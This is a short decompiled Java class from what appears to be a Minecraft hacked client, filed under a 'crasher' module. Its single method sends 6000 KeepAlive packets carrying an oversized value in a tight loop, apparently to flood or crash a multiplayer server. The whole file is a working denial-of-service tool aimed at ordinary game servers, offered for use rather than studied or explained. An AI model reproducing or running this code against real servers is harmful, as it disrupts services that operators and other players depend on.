// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketKeepAlive;
import net.minecraft.client.Minecraft;

public class KeepAliveCrasher
{
    public static void start() {
        for (int i = 0; i < 6000; ++i) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketKeepAlive(2147483647L));
        }
    }
}
